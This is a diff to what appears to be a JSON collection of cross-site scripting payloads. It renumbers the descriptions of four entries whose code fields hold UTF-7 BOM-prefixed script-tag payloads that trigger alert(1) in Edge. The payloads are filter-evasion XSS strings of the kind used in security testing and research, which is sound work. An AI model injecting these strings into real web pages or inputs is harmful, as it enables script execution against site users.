@@ -24,28 +24,28 @@
         ]
     },
     {
-        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "description": "UTF-7 BOM characters (Has to be at the start of the document) 1",
         "code": "+\/v8\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
         "browsers": [
             "edge"
         ]
     },
     {
-        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "description": "UTF-7 BOM characters (Has to be at the start of the document) 2",
         "code": "+\/v9\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
         "browsers": [
             "edge"
         ]
     },
     {
-        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "description": "UTF-7 BOM characters (Has to be at the start of the document) 3",
         "code": "+\/v+\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
         "browsers": [
             "edge"
         ]
     },
     {
-        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "description": "UTF-7 BOM characters (Has to be at the start of the document) 4",
         "code": "+\/v\/\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
         "browsers": [
             "edge"
